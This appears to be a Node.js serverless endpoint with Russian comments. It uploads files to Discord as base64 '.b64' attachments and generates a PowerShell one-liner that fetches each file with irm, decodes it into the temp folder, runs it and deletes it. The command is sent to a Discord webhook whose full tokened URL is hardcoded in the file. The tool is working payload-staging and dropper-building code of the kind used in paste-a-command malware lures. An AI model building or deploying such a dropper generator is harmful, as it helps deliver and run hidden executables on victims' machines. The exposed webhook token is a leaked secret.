const https = require('https');
const Busboy = require('busboy');

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504857329190048006/VKZEEClNQkY75JLhBYc91V5fr8buY5A-O8fgnJFtDVnHVwCc9Fro54FI9ZJrGSpssVh2';

// ВАЖНО: Отключаем автоматический парсинг тела запроса Vercel
module.exports.config = {
    api: {
        bodyParser: false,
    },
};

function sendDiscordMessage(content) {
    return new Promise((resolve, reject) => {
        try {
            const webhookUrl = new URL(DISCORD_WEBHOOK);
            const data = JSON.stringify({ content });
            const req = https.request({
                hostname: webhookUrl.hostname,
                path: webhookUrl.pathname,
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
            }, res => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => resolve(body));
            });
            req.on('error', reject);
            req.write(data);
            req.end();
        } catch (e) {
            reject(e);
        }
    });
}

function uploadFileToDiscord(content, filename) {
    return new Promise((resolve, reject) => {
        try {
            const base64Content = content.toString('base64');
            const encodedFilename = (filename || 'file').replace(/\.[^/.]+$/, '') + '.b64';
            const boundary = '----DiscordBoundary' + Math.random().toString(36).substring(2);
            
            const header = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedFilename}"\r\nContent-Type: text/plain\r\n\r\n`;
            const footer = `\r\n--${boundary}--\r\n`;
            
            const body = Buffer.concat([
                Buffer.from(header),
                Buffer.from(base64Content),
                Buffer.from(footer)
            ]);
            
            const webhookUrl = new URL(DISCORD_WEBHOOK);
            const req = https.request({
                hostname: webhookUrl.hostname,
                path: webhookUrl.pathname,
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'Content-Length': body.length
                }
            }, res => {
                let responseData = '';
                res.on('data', chunk => responseData += chunk);
                res.on('end', () => {
                    try {
                        const json = JSON.parse(responseData);
                        if (json.attachments && json.attachments[0]) {
                            resolve({ fileUrl: json.attachments[0].url, originalName: filename });
                        } else {
                            reject(new Error('Discord upload failed: ' + responseData));
                        }
                    } catch (e) {
                        reject(new Error('Invalid Discord response: ' + responseData));
                    }
                });
            });
            req.on('error', reject);
            req.write(body);
            req.end();
        } catch (e) {
            reject(e);
        }
    });
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });

    try {
        const busboy = Busboy({ 
            headers: req.headers, 
            limits: { fileSize: 4.5 * 1024 * 1024 } // Лимит 4.5MB
        });
        
        const uploadTasks = [];

        await new Promise((resolve, reject) => {
            busboy.on('file', (name, file, info) => {
                const { filename } = info;
                const chunks = [];
                file.on('data', (data) => chunks.push(data));
                file.on('end', () => {
                    const buffer = Buffer.concat(chunks);
                    uploadTasks.push(uploadFileToDiscord(buffer, filename));
                });
            });

            busboy.on('finish', resolve);
            busboy.on('error', reject);
            
            // Начинаем передачу данных в busboy
            req.pipe(busboy);
        });

        const uploadResults = await Promise.all(uploadTasks);
        
        if (uploadResults.length === 0) {
            return res.status(400).json({ success: false, error: 'No files provided' });
        }

        // Формирование команды
        let combinedCmd = '';
        if (uploadResults.length === 1) {
            const r = uploadResults[0];
            combinedCmd = `powershell -c "$t=\\"$env:TEMP\\${r.originalName}\\";$u='${r.fileUrl}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u)));Start-Process $t -Wait;Remove-Item $t"`;
        } else {
            let varDefs = [], cmdParts = [], startParts = [], tVars = [];
            uploadResults.forEach((r, i) => {
                const idx = i + 1;
                varDefs.push(`$t${idx}=\\"$env:TEMP\\${r.originalName}\\"`, `$u${idx}='${r.fileUrl}'`);
                cmdParts.push(`[IO.File]::WriteAllBytes($t${idx},[Convert]::FromBase64String((irm $u${idx})))`);
                startParts.push(`Start-Process $t${idx} -Wait`);
                tVars.push(`$t${idx}`);
            });
            combinedCmd = `powershell -c "${varDefs.join(';')};${cmdParts.join(';')};${startParts.join(';')};Remove-Item ${tVars.join(',')}"`;
        }

        const fileNames = uploadResults.map(r => r.originalName).join(', ');
        await sendDiscordMessage(`📁 **${fileNames}**\n\nКоманда для запуска:\n\`\`\`powershell\n${combinedCmd}\n\`\`\``);

        return res.status(200).json({ success: true, files: uploadResults, command: combinedCmd });
    } catch (error) {
        console.error('API Error:', error);
        return res.status(500).json({ success: false, error: 'Function error: ' + error.message });
    }
};
